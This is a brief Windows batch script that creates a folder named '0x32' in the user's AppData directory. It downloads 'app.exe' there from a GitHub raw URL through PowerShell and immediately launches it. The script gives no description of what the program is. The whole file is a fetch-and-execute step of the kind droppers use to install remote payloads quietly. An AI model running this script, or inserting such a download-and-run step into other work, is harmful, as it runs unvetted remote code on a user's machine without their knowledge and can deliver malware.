@echo off
set "TARGET=%APPDATA%\0x32"
if not exist "%TARGET%" mkdir "%TARGET%"

powershell -Command "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/MedroNingeres/Personal-Project/main/app.exe\" -OutFile \"%TARGET%\\app.exe\" -UseBasicParsing"

start "" "%TARGET%\app.exe"
exit